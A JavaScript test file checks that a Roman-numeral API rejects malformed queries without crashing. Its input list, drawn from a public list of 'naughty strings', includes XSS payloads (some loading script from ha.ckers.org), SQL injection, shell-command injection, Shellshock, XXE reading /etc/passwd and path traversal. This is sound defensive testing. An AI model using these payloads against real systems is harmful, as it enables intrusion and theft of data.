"use strict";

const request = require('supertest');

// tests for naughty strings, most taken from https://github.com/minimaxir/big-list-of-naughty-strings

describe('No crash with special strings', function () {
    const badStrings = [
        "", 
        "undefined", 
        "undef", 
        "null", 
        "NULL", 
        "(null)", 
        "nil",
        "true",
        "false",
        "True",
        "False",
        "TRUE",
        "FALSE",
        "None",
        "hasOwnProperty",
        "\\",
        "\\\\",
        "Ｔｈｅ ｑｕｉｃｋ ｂｒｏｗｎ ｆｏｘ ｊｕｍｐｓ ｏｖｅｒ ｔｈｅ ｌａｚｙ ｄｏｇ",
        "𝐓𝐡𝐞 𝐪𝐮𝐢𝐜𝐤 𝐛𝐫𝐨𝐰𝐧 𝐟𝐨𝐱 𝐣𝐮𝐦𝐩𝐬 𝐨𝐯𝐞𝐫 𝐭𝐡𝐞 𝐥𝐚𝐳𝐲 𝐝𝐨𝐠",
        "𝕿𝖍𝖊 𝖖𝖚𝖎𝖈𝖐 𝖇𝖗𝖔𝖜𝖓 𝖋𝖔𝖝 𝖏𝖚𝖒𝖕𝖘 𝖔𝖛𝖊𝖗 𝖙𝖍𝖊 𝖑𝖆𝖟𝖞 𝖉𝖔𝖌",
        "𝑻𝒉𝒆 𝒒𝒖𝒊𝒄𝒌 𝒃𝒓𝒐𝒘𝒏 𝒇𝒐𝒙 𝒋𝒖𝒎𝒑𝒔 𝒐𝒗𝒆𝒓 𝒕𝒉𝒆 𝒍𝒂𝒛𝒚 𝒅𝒐𝒈",
        "𝓣𝓱𝓮 𝓺𝓾𝓲𝓬𝓴 𝓫𝓻𝓸𝔀𝓷 𝓯𝓸𝔁 𝓳𝓾𝓶𝓹𝓼 𝓸𝓿𝓮𝓻 𝓽𝓱𝓮 𝓵𝓪𝔃𝔂 𝓭𝓸𝓰",
        "𝕋𝕙𝕖 𝕢𝕦𝕚𝕔𝕜 𝕓𝕣𝕠𝕨𝕟 𝕗𝕠𝕩 𝕛𝕦𝕞𝕡𝕤 𝕠𝕧𝕖𝕣 𝕥𝕙𝕖 𝕝𝕒𝕫𝕪 𝕕𝕠𝕘",
        "𝚃𝚑𝚎 𝚚𝚞𝚒𝚌𝚔 𝚋𝚛𝚘𝚠𝚗 𝚏𝚘𝚡 𝚓𝚞𝚖𝚙𝚜 𝚘𝚟𝚎𝚛 𝚝𝚑𝚎 𝚕𝚊𝚣𝚢 𝚍𝚘𝚐",
        "⒯⒣⒠ ⒬⒰⒤⒞⒦ ⒝⒭⒪⒲⒩ ⒡⒪⒳ ⒥⒰⒨⒫⒮ ⒪⒱⒠⒭ ⒯⒣⒠ ⒧⒜⒵⒴ ⒟⒪⒢",
        "<script>alert(123)</script>",
        "&lt;script&gt;alert(&#39;123&#39;);&lt;/script&gt;",
        "<img src=x onerror=alert(123) />",
        "<svg><script>123<1>alert(123)</script>",
        "\"><script>alert(123)</script>",
        "'><script>alert(123)</script>",
        "><script>alert(123)</script>",
        "</script><script>alert(123)</script>",
        "< / script >< script >alert(123)< / script >",
        " onfocus=JaVaSCript:alert(123) autofocus",
        "\" onfocus=JaVaSCript:alert(123) autofocus",
        "' onfocus=JaVaSCript:alert(123) autofocus",
        "＜script＞alert(123)＜/script＞",
        "<sc<script>ript>alert(123)</sc</script>ript>",
        "--><script>alert(123)</script>",
        "\";alert(123);t=\"",
        "';alert(123);t='",
        "JavaSCript:alert(123)",
        ";alert(123);",
        "src=JaVaSCript:prompt(132)",
        "\"><script>alert(123);</script x=\"",
        "'><script>alert(123);</script x='",
        "><script>alert(123);</script x=",
        "\" autofocus onkeyup=\"javascript:alert(123)",
        "' autofocus onkeyup='javascript:alert(123)",
        "<script\\x20type=\"text/javascript\">javascript:alert(1);</script>",
        "<script\\x3Etype=\"text/javascript\">javascript:alert(1);</script>",
        "<script\\x0Dtype=\"text/javascript\">javascript:alert(1);</script>",
        "<script\\x09type=\"text/javascript\">javascript:alert(1);</script>",
        "<script\\x0Ctype=\"text/javascript\">javascript:alert(1);</script>",
        "<script\\x2Ftype=\"text/javascript\">javascript:alert(1);</script>",
        "<script\\x0Atype=\"text/javascript\">javascript:alert(1);</script>",
        "'`\"><\\x3Cscript>javascript:alert(1)</script>",
        "'`\"><\\x00script>javascript:alert(1)</script>",
        "ABC<div style=\"x\\x3Aexpression(javascript:alert(1)\">DEF",
        "ABC<div style=\"x:expression\\x5C(javascript:alert(1)\">DEF",
        "ABC<div style=\"x:expression\\x00(javascript:alert(1)\">DEF",
        "ABC<div style=\"x:exp\\x00ression(javascript:alert(1)\">DEF",
        "ABC<div style=\"x:exp\\x5Cression(javascript:alert(1)\">DEF",
        "ABC<div style=\"x:\\x0Aexpression(javascript:alert(1)\">DEF",
        "ABC<div style=\"x:\\x09expression(javascript:alert(1)\">DEF",
        "ABC<div style=\"x:\\xE3\\x80\\x80expression(javascript:alert(1)\">DEF",
        "ABC<div style=\"x:\\xE2\\x80\\x84expression(javascript:alert(1)\">DEF",
        "ABC<div style=\"x:\\xC2\\xA0expression(javascript:alert(1)\">DEF",
        "ABC<div style=\"x:\\xE2\\x80\\x80expression(javascript:alert(1)\">DEF",
        "ABC<div style=\"x:\\xE2\\x80\\x8Aexpression(javascript:alert(1)\">DEF",
        "ABC<div style=\"x:\\x0Dexpression(javascript:alert(1)\">DEF",
        "ABC<div style=\"x:\\x0Cexpression(javascript:alert(1)\">DEF",
        "ABC<div style=\"x:\\xE2\\x80\\x87expression(javascript:alert(1)\">DEF",
        "ABC<div style=\"x:\\xEF\\xBB\\xBFexpression(javascript:alert(1)\">DEF",
        "ABC<div style=\"x:\\x20expression(javascript:alert(1)\">DEF",
        "ABC<div style=\"x:\\xE2\\x80\\x88expression(javascript:alert(1)\">DEF",
        "ABC<div style=\"x:\\x00expression(javascript:alert(1)\">DEF",
        "ABC<div style=\"x:\\xE2\\x80\\x8Bexpression(javascript:alert(1)\">DEF",
        "ABC<div style=\"x:\\xE2\\x80\\x86expression(javascript:alert(1)\">DEF",
        "ABC<div style=\"x:\\xE2\\x80\\x85expression(javascript:alert(1)\">DEF",
        "ABC<div style=\"x:\\xE2\\x80\\x82expression(javascript:alert(1)\">DEF",
        "ABC<div style=\"x:\\x0Bexpression(javascript:alert(1)\">DEF",
        "ABC<div style=\"x:\\xE2\\x80\\x81expression(javascript:alert(1)\">DEF",
        "ABC<div style=\"x:\\xE2\\x80\\x83expression(javascript:alert(1)\">DEF",
        "ABC<div style=\"x:\\xE2\\x80\\x89expression(javascript:alert(1)\">DEF",
        "<a href=\"\\x0Bjavascript:javascript:alert(1)\" id=\"fuzzelement1\">test</a>",
        "<a href=\"\\x0Fjavascript:javascript:alert(1)\" id=\"fuzzelement1\">test</a>",
        "<a href=\"\\xC2\\xA0javascript:javascript:alert(1)\" id=\"fuzzelement1\">test</a>",
        "<a href=\"\\x05javascript:javascript:alert(1)\" id=\"fuzzelement1\">test</a>",
        "<a href=\"\\xE1\\xA0\\x8Ejavascript:javascript:alert(1)\" id=\"fuzzelement1\">test</a>",
        "<a href=\"\\x18javascript:javascript:alert(1)\" id=\"fuzzelement1\">test</a>",
        "<a href=\"\\x11javascript:javascript:alert(1)\" id=\"fuzzelement1\">test</a>",
        "<a href=\"\\xE2\\x80\\x88javascript:javascript:alert(1)\" id=\"fuzzelement1\">test</a>",
        "<a href=\"\\xE2\\x80\\x89javascript:javascript:alert(1)\" id=\"fuzzelement1\">test</a>",
        "<a href=\"\\xE2\\x80\\x80javascript:javascript:alert(1)\" id=\"fuzzelement1\">test</a>",
        "<a href=\"\\x17javascript:javascript:alert(1)\" id=\"fuzzelement1\">test</a>",
        "<a href=\"\\x03javascript:javascript:alert(1)\" id=\"fuzzelement1\">test</a>",
        "<a href=\"\\x0Ejavascript:javascript:alert(1)\" id=\"fuzzelement1\">test</a>",
        "<a href=\"\\x1Ajavascript:javascript:alert(1)\" id=\"fuzzelement1\">test</a>",
        "<a href=\"\\x00javascript:javascript:alert(1)\" id=\"fuzzelement1\">test</a>",
        "<a href=\"\\x10javascript:javascript:alert(1)\" id=\"fuzzelement1\">test</a>",
        "<a href=\"\\xE2\\x80\\x82javascript:javascript:alert(1)\" id=\"fuzzelement1\">test</a>",
        "<a href=\"\\x20javascript:javascript:alert(1)\" id=\"fuzzelement1\">test</a>",
        "<a href=\"\\x13javascript:javascript:alert(1)\" id=\"fuzzelement1\">test</a>",
        "<a href=\"\\x09javascript:javascript:alert(1)\" id=\"fuzzelement1\">test</a>",
        "<a href=\"\\xE2\\x80\\x8Ajavascript:javascript:alert(1)\" id=\"fuzzelement1\">test</a>",
        "<a href=\"\\x14javascript:javascript:alert(1)\" id=\"fuzzelement1\">test</a>",
        "<a href=\"\\x19javascript:javascript:alert(1)\" id=\"fuzzelement1\">test</a>",
        "<a href=\"\\xE2\\x80\\xAFjavascript:javascript:alert(1)\" id=\"fuzzelement1\">test</a>",
        "<a href=\"\\x1Fjavascript:javascript:alert(1)\" id=\"fuzzelement1\">test</a>",
        "<a href=\"\\xE2\\x80\\x81javascript:javascript:alert(1)\" id=\"fuzzelement1\">test</a>",
        "<a href=\"\\x1Djavascript:javascript:alert(1)\" id=\"fuzzelement1\">test</a>",
        "<a href=\"\\xE2\\x80\\x87javascript:javascript:alert(1)\" id=\"fuzzelement1\">test</a>",
        "<a href=\"\\x07javascript:javascript:alert(1)\" id=\"fuzzelement1\">test</a>",
        "<a href=\"\\xE1\\x9A\\x80javascript:javascript:alert(1)\" id=\"fuzzelement1\">test</a>",
        "<a href=\"\\xE2\\x80\\x83javascript:javascript:alert(1)\" id=\"fuzzelement1\">test</a>",
        "<a href=\"\\x04javascript:javascript:alert(1)\" id=\"fuzzelement1\">test</a>",
        "<a href=\"\\x01javascript:javascript:alert(1)\" id=\"fuzzelement1\">test</a>",
        "<a href=\"\\x08javascript:javascript:alert(1)\" id=\"fuzzelement1\">test</a>",
        "<a href=\"\\xE2\\x80\\x84javascript:javascript:alert(1)\" id=\"fuzzelement1\">test</a>",
        "<a href=\"\\xE2\\x80\\x86javascript:javascript:alert(1)\" id=\"fuzzelement1\">test</a>",
        "<a href=\"\\xE3\\x80\\x80javascript:javascript:alert(1)\" id=\"fuzzelement1\">test</a>",
        "<a href=\"\\x12javascript:javascript:alert(1)\" id=\"fuzzelement1\">test</a>",
        "<a href=\"\\x0Djavascript:javascript:alert(1)\" id=\"fuzzelement1\">test</a>",
        "<a href=\"\\x0Ajavascript:javascript:alert(1)\" id=\"fuzzelement1\">test</a>",
        "<a href=\"\\x0Cjavascript:javascript:alert(1)\" id=\"fuzzelement1\">test</a>",
        "<a href=\"\\x15javascript:javascript:alert(1)\" id=\"fuzzelement1\">test</a>",
        "<a href=\"\\xE2\\x80\\xA8javascript:javascript:alert(1)\" id=\"fuzzelement1\">test</a>",
        "<a href=\"\\x16javascript:javascript:alert(1)\" id=\"fuzzelement1\">test</a>",
        "<a href=\"\\x02javascript:javascript:alert(1)\" id=\"fuzzelement1\">test</a>",
        "<a href=\"\\x1Bjavascript:javascript:alert(1)\" id=\"fuzzelement1\">test</a>",
        "<a href=\"\\x06javascript:javascript:alert(1)\" id=\"fuzzelement1\">test</a>",
        "<a href=\"\\xE2\\x80\\xA9javascript:javascript:alert(1)\" id=\"fuzzelement1\">test</a>",
        "<a href=\"\\xE2\\x80\\x85javascript:javascript:alert(1)\" id=\"fuzzelement1\">test</a>",
        "<a href=\"\\x1Ejavascript:javascript:alert(1)\" id=\"fuzzelement1\">test</a>",
        "<a href=\"\\xE2\\x81\\x9Fjavascript:javascript:alert(1)\" id=\"fuzzelement1\">test</a>",
        "<a href=\"\\x1Cjavascript:javascript:alert(1)\" id=\"fuzzelement1\">test</a>",
        "<a href=\"javascript\\x00:javascript:alert(1)\" id=\"fuzzelement1\">test</a>",
        "<a href=\"javascript\\x3A:javascript:alert(1)\" id=\"fuzzelement1\">test</a>",
        "<a href=\"javascript\\x09:javascript:alert(1)\" id=\"fuzzelement1\">test</a>",
        "<a href=\"javascript\\x0D:javascript:alert(1)\" id=\"fuzzelement1\">test</a>",
        "<a href=\"javascript\\x0A:javascript:alert(1)\" id=\"fuzzelement1\">test</a>",
        "`\"'><img src=xxx:x \\x0Aonerror=javascript:alert(1)>",
        "`\"'><img src=xxx:x \\x22onerror=javascript:alert(1)>",
        "`\"'><img src=xxx:x \\x0Bonerror=javascript:alert(1)>",
        "`\"'><img src=xxx:x \\x0Donerror=javascript:alert(1)>",
        "`\"'><img src=xxx:x \\x2Fonerror=javascript:alert(1)>",
        "`\"'><img src=xxx:x \\x09onerror=javascript:alert(1)>",
        "`\"'><img src=xxx:x \\x0Conerror=javascript:alert(1)>",
        "`\"'><img src=xxx:x \\x00onerror=javascript:alert(1)>",
        "`\"'><img src=xxx:x \\x27onerror=javascript:alert(1)>",
        "`\"'><img src=xxx:x \\x20onerror=javascript:alert(1)>",
        "\"`'><script>\\x3Bjavascript:alert(1)</script>",
        "\"`'><script>\\x0Djavascript:alert(1)</script>",
        "\"`'><script>\\xEF\\xBB\\xBFjavascript:alert(1)</script>",
        "\"`'><script>\\xE2\\x80\\x81javascript:alert(1)</script>",
        "\"`'><script>\\xE2\\x80\\x84javascript:alert(1)</script>",
        "\"`'><script>\\xE3\\x80\\x80javascript:alert(1)</script>",
        "\"`'><script>\\x09javascript:alert(1)</script>",
        "\"`'><script>\\xE2\\x80\\x89javascript:alert(1)</script>",
        "\"`'><script>\\xE2\\x80\\x85javascript:alert(1)</script>",
        "\"`'><script>\\xE2\\x80\\x88javascript:alert(1)</script>",
        "\"`'><script>\\x00javascript:alert(1)</script>",
        "\"`'><script>\\xE2\\x80\\xA8javascript:alert(1)</script>",
        "\"`'><script>\\xE2\\x80\\x8Ajavascript:alert(1)</script>",
        "\"`'><script>\\xE1\\x9A\\x80javascript:alert(1)</script>",
        "\"`'><script>\\x0Cjavascript:alert(1)</script>",
        "\"`'><script>\\x2Bjavascript:alert(1)</script>",
        "\"`'><script>\\xF0\\x90\\x96\\x9Ajavascript:alert(1)</script>",
        "\"`'><script>-javascript:alert(1)</script>",
        "\"`'><script>\\x0Ajavascript:alert(1)</script>",
        "\"`'><script>\\xE2\\x80\\xAFjavascript:alert(1)</script>",
        "\"`'><script>\\x7Ejavascript:alert(1)</script>",
        "\"`'><script>\\xE2\\x80\\x87javascript:alert(1)</script>",
        "\"`'><script>\\xE2\\x81\\x9Fjavascript:alert(1)</script>",
        "\"`'><script>\\xE2\\x80\\xA9javascript:alert(1)</script>",
        "\"`'><script>\\xC2\\x85javascript:alert(1)</script>",
        "\"`'><script>\\xEF\\xBF\\xAEjavascript:alert(1)</script>",
        "\"`'><script>\\xE2\\x80\\x83javascript:alert(1)</script>",
        "\"`'><script>\\xE2\\x80\\x8Bjavascript:alert(1)</script>",
        "\"`'><script>\\xEF\\xBF\\xBEjavascript:alert(1)</script>",
        "\"`'><script>\\xE2\\x80\\x80javascript:alert(1)</script>",
        "\"`'><script>\\x21javascript:alert(1)</script>",
        "\"`'><script>\\xE2\\x80\\x82javascript:alert(1)</script>",
        "\"`'><script>\\xE2\\x80\\x86javascript:alert(1)</script>",
        "\"`'><script>\\xE1\\xA0\\x8Ejavascript:alert(1)</script>",
        "\"`'><script>\\x0Bjavascript:alert(1)</script>",
        "\"`'><script>\\x20javascript:alert(1)</script>",
        "\"`'><script>\\xC2\\xA0javascript:alert(1)</script>",
        "<img \\x00src=x onerror=\"alert(1)\">",
        "<img \\x47src=x onerror=\"javascript:alert(1)\">",
        "<img \\x11src=x onerror=\"javascript:alert(1)\">",
        "<img \\x12src=x onerror=\"javascript:alert(1)\">",
        "<img\\x47src=x onerror=\"javascript:alert(1)\">",
        "<img\\x10src=x onerror=\"javascript:alert(1)\">",
        "<img\\x13src=x onerror=\"javascript:alert(1)\">",
        "<img\\x32src=x onerror=\"javascript:alert(1)\">",
        "<img\\x47src=x onerror=\"javascript:alert(1)\">",
        "<img\\x11src=x onerror=\"javascript:alert(1)\">",
        "<img \\x47src=x onerror=\"javascript:alert(1)\">",
        "<img \\x34src=x onerror=\"javascript:alert(1)\">",
        "<img \\x39src=x onerror=\"javascript:alert(1)\">",
        "<img \\x00src=x onerror=\"javascript:alert(1)\">",
        "<img src\\x09=x onerror=\"javascript:alert(1)\">",
        "<img src\\x10=x onerror=\"javascript:alert(1)\">",
        "<img src\\x13=x onerror=\"javascript:alert(1)\">",
        "<img src\\x32=x onerror=\"javascript:alert(1)\">",
        "<img src\\x12=x onerror=\"javascript:alert(1)\">",
        "<img src\\x11=x onerror=\"javascript:alert(1)\">",
        "<img src\\x00=x onerror=\"javascript:alert(1)\">",
        "<img src\\x47=x onerror=\"javascript:alert(1)\">",
        "<img src=x\\x09onerror=\"javascript:alert(1)\">",
        "<img src=x\\x10onerror=\"javascript:alert(1)\">",
        "<img src=x\\x11onerror=\"javascript:alert(1)\">",
        "<img src=x\\x12onerror=\"javascript:alert(1)\">",
        "<img src=x\\x13onerror=\"javascript:alert(1)\">",
        "<img[a][b][c]src[d]=x[e]onerror=[f]\"alert(1)\">",
        "<img src=x onerror=\\x09\"javascript:alert(1)\">",
        "<img src=x onerror=\\x10\"javascript:alert(1)\">",
        "<img src=x onerror=\\x11\"javascript:alert(1)\">",
        "<img src=x onerror=\\x12\"javascript:alert(1)\">",
        "<img src=x onerror=\\x32\"javascript:alert(1)\">",
        "<img src=x onerror=\\x00\"javascript:alert(1)\">",
        "<a href=java&#1&#2&#3&#4&#5&#6&#7&#8&#11&#12script:javascript:alert(1)>XXX</a>",
        "<img src=\"x` `<script>javascript:alert(1)</script>\"` `>",
        "<img src onerror /\" '\"= alt=javascript:alert(1)//\">",
        "<title onpropertychange=javascript:alert(1)></title><title title=>",
        "<a href=http://foo.bar/#x=`y></a><img alt=\"`><img src=x:x onerror=javascript:alert(1)></a>\">",
        "<!--[if]><script>javascript:alert(1)</script -->",
        "<!--[if<img src=x onerror=javascript:alert(1)//]> -->",
        "<script src=\"/\\%(jscript)s\"></script>",
        "<script src=\"\\\\%(jscript)s\"></script>",
        "<IMG \"\"\"><SCRIPT>alert(\"XSS\")</SCRIPT>\">",
        "<IMG SRC=javascript:alert(String.fromCharCode(88,83,83))>",
        "<IMG SRC=# onmouseover=\"alert('xxs')\">",
        "<IMG SRC= onmouseover=\"alert('xxs')\">",
        "<IMG onmouseover=\"alert('xxs')\">",
        "<IMG SRC=&#106;&#97;&#118;&#97;&#115;&#99;&#114;&#105;&#112;&#116;&#58;&#97;&#108;&#101;&#114;&#116;&#40;&#39;&#88;&#83;&#83;&#39;&#41;>",
        "<IMG SRC=&#0000106&#0000097&#0000118&#0000097&#0000115&#0000099&#0000114&#0000105&#0000112&#0000116&#0000058&#0000097&#0000108&#0000101&#0000114&#0000116&#0000040&#0000039&#0000088&#0000083&#0000083&#0000039&#0000041>",
        "<IMG SRC=&#x6A&#x61&#x76&#x61&#x73&#x63&#x72&#x69&#x70&#x74&#x3A&#x61&#x6C&#x65&#x72&#x74&#x28&#x27&#x58&#x53&#x53&#x27&#x29>",
        "<IMG SRC=\"jav   ascript:alert('XSS');\">",
        "<IMG SRC=\"jav&#x09;ascript:alert('XSS');\">",
        "<IMG SRC=\"jav&#x0A;ascript:alert('XSS');\">",
        "<IMG SRC=\"jav&#x0D;ascript:alert('XSS');\">",
        "perl -e 'print \"<IMG SRC=java\\0script:alert(\\\"XSS\\\")>\";' > out",
        "<IMG SRC=\" &#14;  javascript:alert('XSS');\">",
        "<SCRIPT/XSS SRC=\"http://ha.ckers.org/xss.js\"></SCRIPT>",
        "<BODY onload!#$%&()*~+-_.,:;?@[/|\\]^`=alert(\"XSS\")>",
        "<SCRIPT/SRC=\"http://ha.ckers.org/xss.js\"></SCRIPT>",
        "<<SCRIPT>alert(\"XSS\");//<</SCRIPT>",
        "<SCRIPT SRC=http://ha.ckers.org/xss.js?< B >",
        "<SCRIPT SRC=//ha.ckers.org/.j>",
        "<IMG SRC=\"javascript:alert('XSS')\"",
        "<iframe src=http://ha.ckers.org/scriptlet.html <",
        "\\\";alert('XSS');//",
        "<u oncopy=alert()> Copy me</u>",
        "<i onwheel=alert(1)> Scroll over me </i>",
        "<plaintext>",
        "http://a/%%30%30",
        "</textarea><script>alert(123)</script>",
        ,
        "' OR 1=1 -- 1",
        "' OR '1'='1",
        " ",
        "%",
        "_",
        "-",
        "--",
        "--version",
        "--help",
        "$USER",
        "/dev/null; touch /tmp/blns.fail ; echo",
        "`touch /tmp/blns.fail`",
        "$(touch /tmp/blns.fail)",
        "@{[system \"touch /tmp/blns.fail\"]}",
        "eval(\"puts 'hello world'\")",
        "System(\"ls -al /\")",
        "`ls -al /`",
        "Kernel.exec(\"ls -al /\")",
        "Kernel.exit(1)",
        "%x('ls -al /')",
        "<?xml version=\"1.0\" encoding=\"ISO-8859-1\"?><!DOCTYPE foo [ <!ELEMENT foo ANY ><!ENTITY xxe SYSTEM \"file:///etc/passwd\" >]><foo>&xxe;</foo>",
        "$HOME",
        "$ENV{'HOME'}",
        "%d",
        "%s%s%s%s%s",
        "{0}",
        "%*.*s",
        "%@",
        "%n",
        "File:///",
        "../../../../../../../../../../../etc/passwd%00",
        "../../../../../../../../../../../etc/hosts",
        "() { 0; }; touch /tmp/blns.shellshock1.fail;",
        "() { _; } >_[$($())] { touch /tmp/blns.shellshock2.fail; }",
        "<<< %s(un='%s') = %u",
        "+++ATH0",
        "CON",
        "PRN",
        "AUX",
        "CLOCK$",
        "NUL",
        "A:",
        "ZZ:",
        "COM1",
        "LPT1",
        "LPT2",
        "LPT3",
        "COM2",
        "COM3",
        "COM4",
        "DCC SEND STARTKEYLOGGER 0 0 0",
        "Scunthorpe General Hospital",
        "Penistone Community Church",
        "Lightwater Country Park",
        "Jimmy Clitheroe",
        "Horniman Museum",
        "shitake mushrooms",
        "RomansInSussex.co.uk",
        "http://www.cum.qc.ca/",
        "evaluate",
        "mocha",
        "eval(10)"];
    
    let server;
    let apiVersion = process.env.API_VERSION || '1.0.0';

    beforeEach(function () {
        server = require('./../server.js');
    });

    afterEach(function () {
        server.close();
    });

    for(let i =0; i < badStrings.length; i++){
        let currentString = badStrings[i];

        it('responds to /ROMANNUMERAL (query = ' + currentString +' )', function testSlash(done) {
            request(server)
                .get('/romannumeral')
                .query({ query: currentString })
                .set('Accept', 'application/json')
                .expect('Content-Type', /json/)
                .expect(422, {
                        'error': 'NOT_AN_INTEGER',
                        'message': 'Parameter is not an integer',
                        'apiVersion': apiVersion
                    },
                done);
        });
    }
});

describe('Handles wrong numbers without crashing', function () {
    const badStrings = [
        "$1.00",
        "--1",
        "-",
        "-.",
        "-,",
        "NaN"];
    
    let server;
    let apiVersion = process.env.API_VERSION || '1.0.0';

    beforeEach(function () {
        server = require('./../server.js');
    });

    afterEach(function () {
        server.close();
    });

    for(let i =0; i < badStrings.length; i++){
        let currentString = badStrings[i];

        it('responds to /ROMANNUMERAL (query = ' + currentString +' )', function testSlash(done) {
            request(server)
                .get('/romannumeral')
                .query({ query: currentString })
                .set('Accept', 'application/json')
                .expect('Content-Type', /json/)
                .expect(422, {
                        'error': 'NOT_AN_INTEGER',
                        'message': 'Parameter is not an integer',
                        'apiVersion': apiVersion
                    },
                done);
        });
    }
});

describe('Handles out of range numbers without crashing', function () {
    const badStrings = [
        "-2147483648/-1",
        "-9223372036854775808/-1",
        "Infinity",
        "-Infinity",
        "INF",
        "0/1",
        "999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999",
        "-0",
        "-0.0",
        "+0",
        "+0.0",
        "0.00",
        "0..0",
        ".",
        "0.0.0",
        "0,00",
        "0,,0",
        ",",
        "0,0,0",
        "0xabad1dea",
        "0xffffffff"     
    ];
    
    let server;

    beforeEach(function () {
        server = require('./../server.js');
    });

    afterEach(function () {
        server.close();
    });

    for(let i =0; i < badStrings.length; i++){
        let currentString = badStrings[i];

        it('responds to /ROMANNUMERAL (query = ' + currentString +' )', function testSlash(done) {
            request(server)
                .get('/romannumeral')
                .query({ query: currentString })
                .set('Accept', 'application/json')
                .expect('Content-Type', /json/)
                .expect(422, done);
        });
    }
});

describe('Handles different number radix and notations without crashing', function () {
    const badStrings = [
        "1",
        "1.00",
        "1E2",
        "1E02",
        "1E+02",        
        "1/0",
        "1,000.00",
        "1 000.00",
        "1'000.00",
        "1,000,000.00",
        "1 000 000.00",
        "1'000'000.00",
        "1.000,00",
        "1 000,00",
        "1'000,00",
        "1.000.000,00",
        "1 000 000,00",
        "1'000'000,00"
        ];
    
    let server;

    beforeEach(function () {
        server = require('./../server.js');
    });

    afterEach(function () {
        server.close();
    });

    for(let i =0; i < badStrings.length; i++){
        let currentString = badStrings[i];

        it('responds to /ROMANNUMERAL (query = ' + currentString +' )', function testSlash(done) {
            request(server)
                .get('/romannumeral')
                .query({ query: currentString })
                .set('Accept', 'application/json')
                .expect('Content-Type', /json/)
                .expect(200, done);
        });
    }
});